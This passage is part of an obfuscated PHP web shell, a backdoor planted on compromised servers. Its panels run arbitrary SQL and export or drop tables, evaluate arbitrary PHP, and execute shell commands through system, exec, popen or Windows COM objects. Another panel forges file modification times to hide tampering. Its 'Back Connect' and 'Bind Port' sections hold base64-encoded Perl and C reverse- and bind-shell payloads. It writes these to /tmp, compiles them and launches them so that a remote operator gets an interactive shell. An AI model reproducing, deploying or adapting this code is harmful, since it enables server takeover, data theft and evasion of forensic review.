	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$('settable').doing.value=doing;
	}
	if (page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
</script>
<?php  formhead(array('name' => 'recordlist')); makehide('doing'); makehide('action', 'sqladmin'); makehide('base64'); makehide('tablename'); p($sp49f45f); formfoot(); formhead(array('name' => 'setdbname')); makehide('action', 'sqladmin'); p($sp49f45f); if (!$spf835c8) { makehide('dbname'); } formfoot(); formhead(array('name' => 'settable')); makehide('action', 'sqladmin'); p($sp49f45f); makehide('tablename'); makehide('page', $sp2cc5f8); makehide('doing'); formfoot(); $sp10f4c9 = array(); $sp1ac7c3 = 30; $sp2cc5f8 = intval($sp2cc5f8); if ($sp2cc5f8) { $spbf655b = ($sp2cc5f8 - 1) * $sp1ac7c3; } else { $spbf655b = 0; $sp2cc5f8 = 1; } if (isset($spf65dbc) && isset($sp9d1e01) && isset($sp686c1a) && isset($sp156aba)) { dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8, $spe887a2, $spa00579); $sp972b78 = mysql_get_server_info(); p('<p>MySQL ' . $sp972b78 . ' running in ' . $spf65dbc . ' as ' . $sp9d1e01 . '@' . $spf65dbc . '</p>'); $sp26bdfa = $sp972b78 > '4.1' ? 1 : 0; $spd2724c = q('SHOW DATABASES'); $sp7d367d = array(); $sp7d367d[] = '-- Select a database --'; while ($sp7a8f47 = mysql_fetch_array($spd2724c)) { $sp7d367d[$sp7a8f47['Database']] = $sp7a8f47['Database']; } makeselect(array('title' => 'Please select a database:', 'name' => 'db[]', 'option' => $sp7d367d, 'selected' => $spf835c8, 'onchange' => 'moddbname(this.options[this.selectedIndex].value)', 'newline' => 1)); $sp4693ca = array(); if ($spf835c8) { p('<p>'); p('Current dababase: <a href="javascript:moddbname(\'' . $spf835c8 . '\');">' . $spf835c8 . '</a>'); if ($sp455fbb) { p(' | Current Table: <a href="javascript:settable(\'' . $sp455fbb . '\');">' . $sp455fbb . '</a> [ <a href="javascript:settable(\'' . $sp455fbb . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $sp455fbb . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $sp455fbb . '\', \'drop\');">Drop</a> ]'); } p('</p>'); mysql_select_db($spf835c8); $sp87bf15 = ''; $sp406b45 = 0; if ($sp6f7371) { $sp406b45 = 1; } $spb391e6 = 0; if ($sp455fbb && !$sp6f7371) { $sp6f7371 = "SELECT * FROM {$sp455fbb}"; $sp87bf15 = $sp6f7371; $sp6f7371 = $sp6f7371 . " LIMIT {$spbf655b}, {$sp1ac7c3}"; $spb391e6 = 1; } p('<form action="' . $spa5bde5 . '" method="POST">'); p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database ' . $spf835c8 . ':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">' . htmlspecialchars($sp6f7371, ENT_QUOTES) . '</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>'); makehide('tablename', $sp455fbb); makehide('action', 'sqladmin'); p($sp49f45f); p('</form>'); if ($sp455fbb || $sp406b45 && $sp6f7371) { if ($sp960351 == 'structure') { $spea30d5 = q("SHOW COLUMNS FROM {$sp455fbb}"); $sp545af5 = array(); while ($spa53ce4 = mysql_fetch_array($spea30d5)) { $sp545af5[] = $spa53ce4; } p('<table border="0" cellpadding="3" cellspacing="0">'); p('<tr class="head">'); p('<td>Field</td>'); p('<td>Type</td>'); p('<td>Null</td>'); p('<td>Key</td>'); p('<td>Default</td>'); p('<td>Extra</td>'); p('</tr>'); foreach ($sp545af5 as $spa53ce4) { $spa7d501 = bg(); p('<tr class="' . $spa7d501 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $spa7d501 . '\';">'); p('<td>' . $spa53ce4['Field'] . '</td>'); p('<td>' . $spa53ce4['Type'] . '</td>'); p('<td>' . $spa53ce4['Null'] . '&nbsp;</td>'); p('<td>' . $spa53ce4['Key'] . '&nbsp;</td>'); p('<td>' . $spa53ce4['Default'] . '&nbsp;</td>'); p('<td>' . $spa53ce4['Extra'] . '&nbsp;</td>'); p('</tr>'); } tbfoot(); } elseif ($sp960351 == 'insert' || $sp960351 == 'edit') { $spea30d5 = q('SHOW COLUMNS FROM ' . $sp455fbb); while ($spa53ce4 = mysql_fetch_array($spea30d5)) { $sp545af5[] = $spa53ce4; } $sp0e10ac = array(); if ($sp960351 == 'insert') { p('<h2>Insert new line in ' . $sp455fbb . ' table &raquo;</h2>'); } else { p('<h2>Update record in ' . $sp455fbb . ' table &raquo;</h2>'); $sp8ba212 = base64_decode($sp7a8f5b); $spea30d5 = q("SELECT * FROM {$sp455fbb} WHERE {$sp8ba212} LIMIT 1"); $sp0e10ac = mysql_fetch_array($spea30d5); } p('<form method="post" action="' . $spa5bde5 . '">'); p($sp49f45f); makehide('action', 'sqladmin'); makehide('tablename', $sp455fbb); p('<table border="0" cellpadding="3" cellspacing="0">'); foreach ($sp545af5 as $spa53ce4) { if ($sp0e10ac[$spa53ce4['Field']]) { $spc3da4d = htmlspecialchars($sp0e10ac[$spa53ce4['Field']]); } else { $spc3da4d = ''; } $spa7d501 = bg(); p('<tr class="' . $spa7d501 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $spa7d501 . '\';">'); p('<td><b>' . $spa53ce4['Field'] . '</b><br />' . $spa53ce4['Type'] . '</td><td><textarea class="area" name="insertsql[' . $spa53ce4['Field'] . ']" style="width:500px;height:60px;overflow:auto;">' . $spc3da4d . '</textarea></td></tr>'); } if ($sp960351 == 'insert') { p('<tr class="' . bg() . '"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>'); } else { p('<tr class="' . bg() . '"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>'); makehide('base64', $sp7a8f5b); } p('</table></form>'); } else { $spde30a8 = @explode(';', $sp6f7371); foreach ($spde30a8 as $spdaa25b => $spd2724c) { if ($spd2724c) { p("<p><b>Query#{$spdaa25b} : " . htmlspecialchars($spd2724c, ENT_QUOTES) . '</b></p>'); switch (qy($spd2724c)) { case 0: p('<h2>Error : ' . mysql_error() . '</h2>'); break; case 1: if (strtolower(substr($spd2724c, 0, 13)) == 'select * from') { $spb391e6 = 1; } if ($sp87bf15) { $sp745fd7 = mysql_num_rows(q($sp87bf15)); $sp945ae5 = multi($sp745fd7, $sp1ac7c3, $sp2cc5f8, $sp455fbb); } if (!$sp455fbb) { $spa0978a = str_replace(array('', '
', '	'), array(' ', ' ', ' '), trim(htmlspecialchars($spd2724c))); $spa0978a = preg_replace('/\\/\\*[^(\\*\\/)]*\\*\\//i', ' ', $spa0978a); preg_match_all('/from\\s+`{0,1}([\\w]+)`{0,1}\\s+/i', $spa0978a, $sp62e0c9); $sp455fbb = $sp62e0c9[1][0]; } $spea30d5 = q($spd2724c); p($sp945ae5); p('<table border="0" cellpadding="3" cellspacing="0">'); p('<tr class="head">'); if ($spb391e6) { p('<td>Action</td>'); } $sp641576 = @mysql_num_fields($spea30d5); for ($sp6c3e91 = 0; $sp6c3e91 < $sp641576; $sp6c3e91++) { $sp19dd0c = @mysql_field_name($spea30d5, $sp6c3e91); $spb06e63 = @mysql_field_type($spea30d5, $sp6c3e91); $spb072fb = @mysql_field_len($spea30d5, $sp6c3e91); p("<td nowrap>{$sp19dd0c}<br><span>{$spb06e63}({$spb072fb})</span></td>"); } p('</tr>'); while ($sp3714eb = @mysql_fetch_assoc($spea30d5)) { $spa7d501 = bg(); p('<tr class="' . $spa7d501 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $spa7d501 . '\';">'); $sp8ba212 = $sped1c3a = $sp8c9630 = ''; foreach ($sp3714eb as $sp8b00ef => $sp541477) { if ($sp541477) { $sp8ba212 .= $sped1c3a . $sp8b00ef . '=\'' . addslashes($sp541477) . '\''; $sped1c3a = ' AND '; } $sp8c9630 .= '<td nowrap>' . html_clean($sp541477) . '&nbsp;</td>'; } $sp8ba212 = base64_encode($sp8ba212); if ($spb391e6) { p('<td nowrap><a href="javascript:editrecord(\'edit\', \'' . $sp8ba212 . '\', \'' . $sp455fbb . '\');">Edit</a> | <a href="javascript:editrecord(\'del\', \'' . $sp8ba212 . '\', \'' . $sp455fbb . '\');">Del</a></td>'); } p($sp8c9630); p('</tr>'); unset($sp8c9630); } tbfoot(); p($sp945ae5); break; case 2: $sp22376a = mysql_affected_rows(); p('<h2>affected rows : <b>' . $sp22376a . '</b></h2>'); break; } } } } } else { $spd2724c = q('SHOW TABLE STATUS'); $sp39d815 = $spa6f93f = $spbd91c9 = 0; $sp4693ca = array(); while ($sp4297b3 = mysql_fetch_array($spd2724c)) { $spbd91c9 = $spbd91c9 + $sp4297b3['Data_length']; $spa6f93f = $spa6f93f + $sp4297b3['Rows']; $sp4297b3['Data_length'] = sizecount($sp4297b3['Data_length']); $sp39d815++; $sp4693ca[] = $sp4297b3; } $spbd91c9 = sizecount($spbd91c9); unset($sp4297b3); p('<table border="0" cellpadding="0" cellspacing="0">'); p('<form action="' . $spa5bde5 . '" method="POST">'); makehide('action', 'sqladmin'); p($sp49f45f); p('<tr class="head">'); p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>'); p('<td>Name</td>'); p('<td>Rows</td>'); p('<td>Data_length</td>'); p('<td>Create_time</td>'); p('<td>Update_time</td>'); if ($sp26bdfa) { p('<td>Engine</td>'); p('<td>Collation</td>'); } p('</tr>'); foreach ($sp4693ca as $sp8b00ef => $sp4297b3) { $spa7d501 = bg(); p('<tr class="' . $spa7d501 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $spa7d501 . '\';">'); p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="' . $sp4297b3['Name'] . '" /></td>'); p('<td><a href="javascript:settable(\'' . $sp4297b3['Name'] . '\');">' . $sp4297b3['Name'] . '</a> [ <a href="javascript:settable(\'' . $sp4297b3['Name'] . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $sp4297b3['Name'] . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $sp4297b3['Name'] . '\', \'drop\');">Drop</a> ]</td>'); p('<td>' . $sp4297b3['Rows'] . '</td>'); p('<td>' . $sp4297b3['Data_length'] . '</td>'); p('<td>' . $sp4297b3['Create_time'] . '</td>'); p('<td>' . $sp4297b3['Update_time'] . '</td>'); if ($sp26bdfa) { p('<td>' . $sp4297b3['Engine'] . '</td>'); p('<td>' . $sp4297b3['Collation'] . '</td>'); } p('</tr>'); } p('<tr class=' . bg() . '>'); p('<td>&nbsp;</td>'); p('<td>Total tables: ' . $sp39d815 . '</td>'); p('<td>' . $spa6f93f . '</td>'); p('<td>' . $spbd91c9 . '</td>'); p('<td colspan="' . ($sp26bdfa ? 4 : 2) . '">&nbsp;</td>'); p('</tr>'); p('<tr class="' . bg() . '"><td colspan="' . ($sp26bdfa ? 8 : 6) . '"><input name="saveasfile" value="1" type="checkbox" /> Save as file <input class="input" name="path" value="' . SA_ROOT . $_SERVER['HTTP_HOST'] . '_MySQL.sql" type="text" size="60" /> <input class="bt" type="submit" name="downrar" value="Export selection table" /></td></tr>'); makehide('doing', 'backupmysql'); formfoot(); p('</table>'); fr($spd2724c); } } } tbfoot(); @mysql_close(); } elseif ($spd2ab61 == 'net') { !$spf34e9a && ($spf34e9a = $_SERVER['REMOTE_ADDR']); !$spb4d22f && ($spb4d22f = '1370'); $spe16bbe = array('perl' => 'perl', 'php' => 'php (proc_open)', 'c' => 'c'); $sp285c88 = 'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj' . 'aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR' . 'hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT' . 'sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI' . 'kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi' . 'KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl' . 'OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=='; $sp164739 = 'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC' . 'BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb' . 'SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd' . 'KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ' . 'sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC' . 'Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D' . 'QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp' . 'Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=='; $sp462322 = 'IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS' . 'VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs' . 'JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV' . 'TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG' . 'lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK' . 'Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i' . 'Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N' . 'lIENPTk47DQpleGl0IDA7DQp9DQp9'; echo '[syslog]03
'; if ($sp13e00e && $spf34e9a && $spb4d22f && $spfccf3e) { if ($spfccf3e == 'perl') { cf('/tmp/magiccoder_bc', $sp285c88); switch ($_POST['execfunction_cb']) { case 'system': $spfd181b = @system(which('perl') . " /tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'passthru': $spfd181b = @passthru(which('perl') . " /tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'exec': $spfd181b = @exec(which('perl') . " /tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'execute': $spfd181b = @execute(which('perl') . " /tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'shell_exec': $spfd181b = @shell_exec(which('perl') . " /tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'popen': $spfd181b = @fread(popen(which('perl') . " /tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &", r), 9999); break; } } elseif ($spfccf3e == 'php') { set_time_limit(0); $sp2dec6e = '1.0'; $sp0bd168 = $spf34e9a; $sp2d79fe = $spb4d22f; $spb5ce3f = 1400; $sp254447 = null; $spbf6996 = null; $sp91772b = 'uname -a; w; id; /bin/sh -i'; $sp981d3a = 0; $sp160c2e = 0; chdir('/'); umask(0); $spfe78c5 = @fsockopen($sp0bd168, $sp2d79fe, $spfe6fb7, $sp2ea0cc, 30); if (!$spfe78c5) { echo "{$sp2ea0cc} ({$spfe6fb7})"; die(1); } $sp3f9f68 = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')); $sp621347 = proc_open($sp91772b, $sp3f9f68, $spc3c09c); if (!is_resource($sp621347)) { die(1); } stream_set_blocking($spc3c09c[0], 0); stream_set_blocking($spc3c09c[1], 0); stream_set_blocking($spc3c09c[2], 0); stream_set_blocking($spfe78c5, 0); while (1) { if (feof($spfe78c5)) { break; } if (feof($spc3c09c[1])) { break; } $sp6ffd97 = array($spfe78c5, $spc3c09c[1], $spc3c09c[2]); $sp59fd7e = stream_select($sp6ffd97, $sp254447, $spbf6996, null); if (in_array($spfe78c5, $sp6ffd97)) { if ($sp160c2e) { echo 'SOCK READ'; } $sp47e3ed = fread($spfe78c5, $spb5ce3f); if ($sp160c2e) { echo "SOCK: {$sp47e3ed}"; } fwrite($spc3c09c[0], $sp47e3ed); } if (in_array($spc3c09c[1], $sp6ffd97)) { if ($sp160c2e) { echo 'STDOUT READ'; } $sp47e3ed = fread($spc3c09c[1], $spb5ce3f); if ($sp160c2e) { echo "STDOUT: {$sp47e3ed}"; } fwrite($spfe78c5, $sp47e3ed); } if (in_array($spc3c09c[2], $sp6ffd97)) { if ($sp160c2e) { echo 'STDERR READ'; } $sp47e3ed = fread($spc3c09c[2], $spb5ce3f); if ($sp160c2e) { echo "STDERR: {$sp47e3ed}"; } fwrite($spfe78c5, $sp47e3ed); } } fclose($spfe78c5); fclose($spc3c09c[0]); fclose($spc3c09c[1]); fclose($spc3c09c[2]); proc_close($sp621347); } else { echo '<center>Use from <b>' . $_POST['execfunction_cb'] . '</b> function<hr width="222px" noshade /></center>'; cf('/tmp/magiccoder_bc.c', $sp164739); switch ($_POST['execfunction_cb']) { case 'system': $spfd181b = @system('gcc -o /tmp/magiccoder_bc /tmp/magiccoder_bc.c'); @unlink('/tmp/magiccoder_bc.c'); $spfd181b = @system("/tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'passthru': $spfd181b = @passthru('gcc -o /tmp/magiccoder_bc /tmp/magiccoder_bc.c'); @unlink('/tmp/magiccoder_bc.c'); $spfd181b = @passthru("/tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'exec': $spfd181b = @exec('gcc -o /tmp/magiccoder_bc /tmp/magiccoder_bc.c'); @unlink('/tmp/magiccoder_bc.c'); $spfd181b = @exec("/tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'execute': $spfd181b = execute('gcc -o /tmp/magiccoder_bc /tmp/magiccoder_bc.c'); @unlink('/tmp/magiccoder_bc.c'); $spfd181b = execute("/tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'shell_exec': $spfd181b = @shell_exec('gcc -o /tmp/magiccoder_bc /tmp/magiccoder_bc.c'); @unlink('/tmp/magiccoder_bc.c'); $spfd181b = @shell_exec("/tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &"); break; case 'popen': $spfd181b = @fread(popen('gcc -o /tmp/magiccoder_bc /tmp/magiccoder_bc.c', r), 9999); @unlink('/tmp/magiccoder_bc.c'); $spfd181b = @fread(popen("/tmp/magiccoder_bc {$spf34e9a} {$spb4d22f} &", r), 9999); break; } } m("Now script try connect to {$spf34e9a} port {$spb4d22f} ..."); echo '<br><center>Use from <b>' . $_POST['execfunction_cb'] . '</b> function<hr width="222px" noshade /></center>'; } formhead(array('title' => 'Back Connect')); makehide('action', 'net'); p('<p>'); p('Your IP:'); makeinput(array('name' => 'yourip', 'size' => 20, 'value' => $spf34e9a)); p('Your Port:'); makeinput(array('name' => 'yourport', 'size' => 15, 'value' => $spb4d22f)); p('Use:'); makeselect(array('name' => 'use', 'option' => $spe16bbe, 'selected' => $spfccf3e)); echo 'Function: <select class="input" name="execfunction_cb" >
<option value="system">system</option>
<option value="passthru">passthru</option>
<option value="exec">exec</option>
<option value="execute">execute</option>
<option value="shell_exec">shell_exec</option>
<option value="popen">popen</option>
</select>
'; makeinput(array('name' => 'start_cb', 'value' => 'Start', 'type' => 'submit', 'class' => 'bt')); p('</p>'); formfoot(); !$spae7b09 && ($spae7b09 = '13700527'); $spe16bbe = array('perl' => 'perl'); if ($spa815c4 && $spb4d22f && $spfccf3e) { if ($spfccf3e == 'perl') { cf('/tmp/magiccoder_bind_pl', $sp462322); switch ($_POST['execfunction_bind']) { case 'system': $spfd181b = @system(which('perl') . " /tmp/magiccoder_bind_pl {$spae7b09} &"); break; case 'passthru': $spfd181b = @passthru(which('perl') . " /tmp/magiccoder_bind_pl {$spae7b09} &"); break; case 'exec': $spfd181b = @exec(which('perl') . " /tmp/magiccoder_bind_pl {$spae7b09} &"); break; case 'execute': $spfd181b = @execute(which('perl') . " /tmp/magiccoder_bind_pl {$spae7b09} &"); break; case 'shell_exec': $spfd181b = @shell_exec(which('perl') . " /tmp/magiccoder_bind_pl {$spae7b09} &"); break; case 'popen': $spfd181b = @fread(popen(which('perl') . " /tmp/magiccoder_bind_pl {$spae7b09} &", r), 9999); break; } } m("bind on port {$spae7b09} Started..."); echo '<br><center>Use from <b>' . $_POST['execfunction_bind'] . '</b> function<hr width="222px" noshade /></center>'; } formhead(array('title' => 'Bind Port')); makehide('action', 'net'); p('<p>'); p('Your Port:'); makeinput(array('name' => 'yourport_bind', 'size' => 15, 'value' => $spae7b09)); p('Use:'); makeselect(array('name' => 'use', 'option' => $spe16bbe, 'selected' => $spfccf3e)); echo 'Function: <select class="input" name="execfunction_bind" >
<option value="system">system</option>
<option value="passthru">passthru</option>
<option value="exec">exec</option>
<option value="execute">execute</option>
<option value="shell_exec">shell_exec</option>
<option value="popen">popen</option>
</select>
'; makeinput(array('name' => 'start_bind', 'value' => 'Start', 'type' => 'submit', 'class' => 'bt')); p('</p>'); formfoot(); } elseif ($spd2ab61 == 'eval') { $sp6030c4 = trim($sp6030c4); if ($sp6030c4) { if (!preg_match('#<\\?#si', $sp6030c4)) { $sp6030c4 = "<?php\n\n{$sp6030c4}\n\n?>"; } eval('?' . ">{$sp6030c4}<?"); } formhead(array('title' => 'Eval PHP Code')); makehide('action', 'eval'); maketext(array('title' => 'PHP Code', 'name' => 'phpcode', 'value' => $sp6030c4)); formfooter(); } elseif ($spd2ab61 == 'editfile') { if (file_exists($sp8136b3)) { $sp694629 = @fopen($sp8136b3, 'r'); $sp5f83f4 = @fread($sp694629, filesize($sp8136b3)); @fclose($sp694629); $sp5f83f4 = htmlspecialchars($sp5f83f4); } formhead(array('title' => 'Create / Edit File')); makehide('action', 'file'); makehide('dir', $sp43bee6); makeinput(array('title' => 'Current File (import new file name and new file)', 'name' => 'editfilename', 'value' => $sp8136b3, 'newline' => 1)); maketext(array('title' => 'File Content', 'name' => 'filecontent', 'value' => $sp5f83f4)); formfooter(); } elseif ($spd2ab61 == 'newtime') { $sp356883 = @filemtime($sp8136b3); $spab4af9 = array('January' => 1, 'February' => 2, 'March' => 3, 'April' => 4, 'May' => 5, 'June' => 6, 'July' => 7, 'August' => 8, 'September' => 9, 'October' => 10, 'November' => 11, 'December' => 12); formhead(array('title' => 'Clone file was last modified time')); makehide('action', 'file'); makehide('dir', $sp43bee6); makeinput(array('title' => 'Alter file', 'name' => 'curfile', 'value' => $sp8136b3, 'size' => 120, 'newline' => 1)); makeinput(array('title' => 'Reference file (fullpath)', 'name' => 'tarfile', 'size' => 120, 'newline' => 1)); formfooter(); formhead(array('title' => 'Set last modified')); makehide('action', 'file'); makehide('dir', $sp43bee6); makeinput(array('title' => 'Current file (fullpath)', 'name' => 'curfile', 'value' => $sp8136b3, 'size' => 120, 'newline' => 1)); p('<p>Instead &raquo;'); p('year:'); makeinput(array('name' => 'year', 'value' => date('Y', $sp356883), 'size' => 4)); p('month:'); makeinput(array('name' => 'month', 'value' => date('m', $sp356883), 'size' => 2)); p('day:'); makeinput(array('name' => 'day', 'value' => date('d', $sp356883), 'size' => 2)); p('hour:'); makeinput(array('name' => 'hour', 'value' => date('H', $sp356883), 'size' => 2)); p('minute:'); makeinput(array('name' => 'minute', 'value' => date('i', $sp356883), 'size' => 2)); p('second:'); makeinput(array('name' => 'second', 'value' => date('s', $sp356883), 'size' => 2)); p('</p>'); formfooter(); } elseif ($spd2ab61 == 'shell') { if (IS_WIN && IS_COM) { if ($spa50437 && $sp3e2f5c) { $sp91772b = new COM('Shell.Application'); $sp5955cc = $sp91772b->ShellExecute($spa50437, $sp3e2f5c); m('Program run has ' . (!$sp5955cc ? 'success' : 'fail')); } !$spa50437 && ($spa50437 = 'c:\\windows\\system32\\cmd.exe'); !$sp3e2f5c && ($sp3e2f5c = '/c net start > ' . SA_ROOT . 'log.txt'); formhead(array('title' => 'Execute Program')); makehide('action', 'shell'); makeinput(array('title' => 'Program', 'name' => 'program', 'value' => $spa50437, 'newline' => 1)); p('<p>'); makeinput(array('title' => 'Parameter', 'name' => 'parameter', 'value' => $sp3e2f5c)); makeinput(array('name' => 'submit', 'class' => 'bt', 'type' => 'submit', 'value' => 'Execute')); p('</p>'); formfoot(); } formhead(array('title' => 'Execute Command')); makehide('action', 'shell'); if (IS_WIN && IS_COM) { $sp6ec4ef = array('phpfunc' => 'phpfunc', 'wscript' => 'wscript', 'proc_open' => 'proc_open'); makeselect(array('title' => 'Use:', 'name' => 'execfunc', 'option' => $sp6ec4ef, 'selected' => $sp5f2522, 'newline' => 1)); } p('<p>'); makeinput(array('title' => 'Command', 'name' => 'command', 'value' => $spfe16e8)); if (!IS_WIN && !IS_COM) { echo '<select class="input" name="execfunction" >
<option value="system">system</option>
<option value="passthru">passthru</option>
<option value="exec">exec</option>
<option value="execute">execute</option>
<option value="shell_exec">shell_exec</option>
<option value="popen">popen</option>
</select>
'; } makeinput(array('name' => 'submit', 'class' => 'bt', 'type' => 'submit', 'value' => 'Execute')); p('</p>'); formfoot(); if ($spfe16e8) { p('<hr width="100%" noshade /><pre>'); if ($sp5f2522 == 'wscript' && IS_WIN && IS_COM) { $spd900a8 = new COM('WScript.shell'); $spd40066 = $spd900a8->exec('cmd.exe /c ' . $spfe16e8); $sp502d2e = $spd40066->StdOut(); $spce0a4e = $sp502d2e->ReadAll(); echo $spce0a4e; } elseif ($sp5f2522 == 'proc_open' && IS_WIN && IS_COM) { $sp3f9f68 = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')); $sp621347 = proc_open($_SERVER['COMSPEC'], $sp3f9f68, $spc3c09c); if (is_resource($sp621347)) { fwrite($spc3c09c[0], $spfe16e8 . '
'); fwrite($spc3c09c[0], 'exit
'); fclose($spc3c09c[0]); while (!feof($spc3c09c[1])) { echo fgets($spc3c09c[1], 1024); } fclose($spc3c09c[1]); while (!feof($spc3c09c[2])) { echo fgets($spc3c09c[2], 1024); } fclose($spc3c09c[2]); proc_close($sp621347); } } else { echo '<center>Use from <b>' . $_POST['execfunction'] . '</b> function<hr width="222px" noshade /></center>'; switch ($_POST['execfunction']) { case 'system': @system($spfe16e8); break; case 'passthru': @passthru($spfe16e8); break; case 'exec': echo @exec($spfe16e8); break; case 'execute': echo @execute($spfe16e8); break; case 'shell_exec': echo @shell_exec($spfe16e8); break; case 'popen': echo @fread(popen($spfe16e8, r), 9999); break; } } p('</pre>'); } } elseif ($spd2ab61 == 'phpenv') { $sp13f526 = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'; $speb9c05 = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from'); !$sp4c12e2 && ($sp4c12e2 = 'No'); $spea4fcd = array(1 => array('Server Time', date('Y/m/d h:i:s', $sp0b64ce)), 2 => array('Server Domain', 